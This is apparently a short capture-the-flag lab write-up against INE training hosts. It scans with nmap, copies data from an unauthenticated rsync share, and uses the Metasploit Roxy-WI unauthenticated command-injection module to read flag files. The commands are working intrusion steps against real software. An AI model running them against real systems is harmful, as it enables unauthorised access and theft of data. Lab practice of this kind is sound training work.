- First target:

```bash
> nmap -sC -sV -T4 target1.ine.local
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

List shares:
> rsync target1.ine.local::
backupwscohen   FLAG1_921c3ac71ed04c11a371c7f5527f5717   

Then exfiltrate the directory:
> rsync -avz target1.ine.local::backupwscohen .
> cat pii_data.xlsx 
FLAG2_6412b97c4dee4948ab681f1babc15440
```

---

- Second target:

```bash
use this module:
0  exploit/linux/http/roxy_wi_exec  2022-07-06       excellent  Yes    Roxy-WI Prior to 6.1.1.0 Unauthenticated Command Injection RCE

Set OPTIONS and Run.

> cat /flag.txt
FLAG3_67956cdbc32a4013a04c8d728f863212


> cd /etc/cron.d
> cat www-data-cron
FLAG4_718bf998fb6b4b9ea33efca5f55f68ab
```